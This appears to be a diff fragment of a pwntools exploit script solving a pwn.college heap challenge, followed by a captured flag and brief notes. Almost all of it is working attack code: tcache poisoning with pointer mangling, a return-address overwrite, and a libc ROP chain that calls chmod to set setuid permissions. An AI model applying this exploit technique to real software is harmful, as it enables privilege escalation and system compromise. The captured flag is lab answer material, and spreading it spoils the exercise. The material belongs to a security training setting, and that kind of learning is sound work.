+        p.sendline(b'malloc 6 16')
+        p.sendline(b'safe_read 4')
+        info(p.clean())
+        p.send(b'a'*16 + p64(0x00) + p64(0x61))
+        p.sendline(b'free 5')
+        p.sendline(b'malloc 7 85')
+        p.sendline(b'free 4')
+        p.sendline(b'free 6')
+        p.sendline(b'safe_read 7')
+        payload = b'a'*16 + p64(0x00) + p64(0x61) + p64(mangle(file_address, alloc))
+        p.send(payload)
+        p.sendline(b'malloc 8 16')
+        p.sendline(b'malloc 9 16')
+        info(p.clean())
+
+
+        # lastly overwrite alloc[0] with the return address
+        # this is like level18
+        p.sendline(b'safe_write 3')
+        # print(f'alloc = {hex(alloc)}')
+        info(p.clean())
+        p.sendline(b'safe_read 9') 
+        p.send(p64(rip))
+        p.sendline(b'safe_read 0')
+        # then send a ropchain 
+        rop = ROP(libc)
+        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
+        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
+        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
+        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
+        trash_string = p64(next(libc.search(b'libc_intl_domainname')))
+        rop_chain = pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall
+        p.send(rop_chain)
+        p.sendline(b'safe_write 3')
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+20.1. pwn.college{QCB2vXkee73pFuv5KwxnG3imYze.01N5QzMsITNxUzW}
+changes...
+    just change how you readuntil after safe_write
+    use: info(p.readuntil(b'Index: \n'))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
